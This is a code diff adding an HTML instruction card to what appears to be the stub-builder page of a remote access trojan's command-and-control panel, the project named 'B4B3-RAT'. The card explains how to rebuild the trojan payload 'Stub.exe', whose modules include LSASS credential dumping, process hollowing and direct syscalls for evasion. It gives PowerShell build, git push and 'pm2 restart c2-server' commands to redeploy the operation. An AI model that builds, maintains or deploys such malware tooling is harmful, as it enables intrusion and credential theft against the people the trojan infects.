@@ -532,6 +532,39 @@ function renderBuilder() {
 </div>
 
 <div class="card" style="max-width:680px;margin:0 auto">
+  <div class="card-title">&#128187; Build Stub on Windows (Local Repo)</div>
+  <p style="font-size:12px;color:var(--muted);line-height:1.6">
+    The full-featured stub requires <strong style="color:var(--light)">MSVC (Visual Studio)</strong> — the advanced modules
+    (<code style="color:var(--accent)">LsassDump</code>, <code style="color:var(--accent)">Hollow</code>,
+    <code style="color:var(--accent)">DirectSyscall</code>, etc.) use MSVC-only intrinsics that MinGW cannot compile.
+    The production <code style="color:var(--accent)">Stub.exe</code> already committed to git is the correct 3.5 MB MSVC build — you only need to
+    rebuild if you modify the source code.
+  </p>
+  <p style="font-size:12px;color:var(--muted);line-height:1.6;margin-top:6px">
+    <strong style="color:var(--light)">Steps to rebuild locally on Windows:</strong>
+  </p>
+  <ol style="font-size:12px;color:var(--muted);line-height:2;padding-left:18px;margin:0">
+    <li>Open <strong style="color:var(--light)">Developer PowerShell for VS</strong> (Start → search "Developer PowerShell") — this adds MSVC to PATH.</li>
+    <li>Navigate to the stub folder:<br>
+      <code style="color:var(--accent);display:block;background:var(--bg);padding:4px 8px;border-radius:4px;margin:4px 0">cd "B4B3-RAT\Stub"</code>
+    </li>
+    <li>Run the build script:<br>
+      <code style="color:var(--accent);display:block;background:var(--bg);padding:4px 8px;border-radius:4px;margin:4px 0">.\build.ps1</code>
+      Or with custom CryptoPP path:<br>
+      <code style="color:var(--accent);display:block;background:var(--bg);padding:4px 8px;border-radius:4px;margin:4px 0">.\build.ps1 -CryptoPP "D:\CryptoPP"</code>
+    </li>
+    <li>After a successful build, <code style="color:var(--accent)">Stub.exe</code> will be ~3.5 MB. Commit and push it:<br>
+      <code style="color:var(--accent);display:block;background:var(--bg);padding:4px 8px;border-radius:4px;margin:4px 0">git add B4B3-RAT/Stub/Stub.exe &amp;&amp; git commit -m "Update Stub.exe" &amp;&amp; git push</code>
+    </li>
+    <li>On the server: <code style="color:var(--accent)">git pull &amp;&amp; pm2 restart c2-server</code></li>
+  </ol>
+  <p style="font-size:11px;color:var(--warn);margin-top:8px;line-height:1.5">
+    &#9888; If build.ps1 fails or Stub.exe becomes 0 KB, restore with:
+    <code style="color:var(--accent)">git checkout -- B4B3-RAT/Stub/Stub.exe</code>
+  </p>
+</div>
+
+<div class="card" style="max-width:680px;margin:0 auto">
   <div class="card-title">&#9881; Compile Stub on Server</div>
   <p style="font-size:12px;color:var(--muted);line-height:1.6">
     Compile <code style="color:var(--accent)">full_stub.cpp</code> directly on the server using the MinGW cross-compiler.
